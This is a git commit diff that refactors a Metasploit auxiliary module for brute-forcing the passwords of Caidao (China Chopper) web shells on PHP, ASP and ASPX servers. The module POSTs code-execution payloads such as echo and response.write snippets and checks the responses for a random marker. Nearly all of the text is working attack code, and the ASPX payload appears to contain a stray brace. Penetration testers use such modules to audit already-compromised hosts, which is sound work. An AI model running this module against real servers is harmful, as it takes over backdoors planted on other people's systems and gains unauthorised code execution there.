1ebb84c40050ff56d8018d610c08f0ec514145d3
nixawk <hap.ddup@gmail.com>
2015-04-29 06:59:34 +0000

    caidao backdoor bruteforce

--- modules/auxiliary/scanner/http/cn_caidao_backdoor_bruteforce.rb
+++ modules/auxiliary/scanner/http/cn_caidao_backdoor_bruteforce.rb
@@ -9,7 +9,6 @@ class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
-  include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
 
   def initialize(info = {})
@@ -17,56 +16,41 @@ class Metasploit3 < Msf::Auxiliary
       'Name'           => 'Chinese Caidao Backdoor Bruteforce',
       'Description'    => 'This module attempts to brute chinese caidao php/asp/aspx backdoor.',
       'Author'         => [ 'Nixawk' ],
-      'References'     => 
-        [
+      'References'     => [
               [ 'URL', 'http://blog.csdn.net/nixawk/article/details/40430329']
         ],
-      'License'        => MSF_LICENSE,  
+      'License'        => MSF_LICENSE
     ))
 
-    register_options(
-      [
-        OptString.new('TARGETURI', 
-                      [ true, 
-                        "The URI to authenticate against", 
-                        "/backdoor.php" ]
-                     ),
-        OptEnum.new('TYPE',
-                   [ true,
-                      "backdoor type",
-                      "PHP",
-                     ["PHP", "ASP", "ASPX"]
-                   ])
-      ], self.class)
+    register_options([
+      OptEnum.new('TYPE', [ true, "backdoor type", "PHP", ["PHP", "ASP", "ASPX"] ]),
+      OptString.new('TARGETURI', [ true, "The URI to authenticate against", "/backdoor.php" ])
+    ], self.class)
+
     register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
   end
 
-  def backdoor_brute(uri, user, pass, payload, regexp)
+  def backdoor_brute(uri, user, pass, payload, match)
     begin
+      data = "&user=#{user}&#{pass}=#{payload}"
       res = send_request_cgi({
           'uri'          =>  uri,
           'method'       =>  "POST",
-          'vars_post'    =>  {
-            'user'   => user,
-            pass   => payload
-           }
+          'data'         =>  "#{data}"
       })
+
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEOUT
       print_error("#{peer} - Service failed to respond")
       return :abort
+
     end
 
-    if res.code = 200 and regexp.match(res.body)
-      print_good("#{peer} - Successful login: password - \"#{pass}\"")
-      report_auth_info({
-        :host        => rhost,
-        :port        => rport,
-        :sname       => (ssl ? 'https': 'http'),
-        :user        => user,
-        :pass        => pass
-      })
+    print_status("#{peer} - brute force caidao password: \"#{pass}\"")
 
-      return :next_user
+    if res and res.code == 200 and res.body =~ /#{match}/mi
+        print_good("#{peer} - Successful login: password - \"#{pass}\"")
+
+        return :next_user
     end
 
     return
@@ -74,34 +58,28 @@ class Metasploit3 < Msf::Auxiliary
 
   def run_host(ip)
     uri = normalize_uri(target_uri.path)
-    typ = datastore['TYPE']
+    script_type = datastore['TYPE']
 
-    payload = nil
-    regexp = /woo5woo/mi
+    junk = Rex::Text::rand_text_alphanumeric(4)
+    match = "#{junk}4#{junk}"
 
-    case typ
+    case script_type
     when /php$/mi
-      print_status("#{peer} - Trying to crack php backdoor")
-
-      payload = '$_="5";echo "woo".$_."woo";'
+      payload = "$_=\"4\";echo \"#{junk}\".$_.\"#{junk}\";";
 
     when /asp$/mi
-      print_status("#{peer} - Trying to crack asp backdoor")
-
-      payload = 'execute("response.write(""woo""):response.write(Len(""admin"")):response.write(""woo""):response.end")'
+      payload = "execute(\"response.write(\"\"#{junk}\"\"):response.write(Len(\"\"#{junk}\"\")):response.write(\"\"#{junk}\"\"):response.end\")"
 
     when /aspx$/mi
-      print_status("#{peer} - Trying to crack aspx backdoor")
-
-      payload = 'Response.Write("woo");Response.Write(1+4);Response.Write("woo")'
+      payload = "Response.Write(\"#{junk}\");Response.Write(Len(\"#{junk}\")});Response.Write(\"#{junk}\")"
 
     else
-      print_error("#{peer} - Backddor type is not support")  
+      print_error("#{peer} - Backddor type is not support")
+      return
     end
 
     each_user_pass { |user, pass|
-      print_status("#{peer} - Trying \"#{uri}\" : \"#{pass}\"")
-      backdoor_brute(uri, user, pass, payload, regexp)
+      backdoor_brute(uri, user, pass, payload, match)
     }
   end
-end  
+end
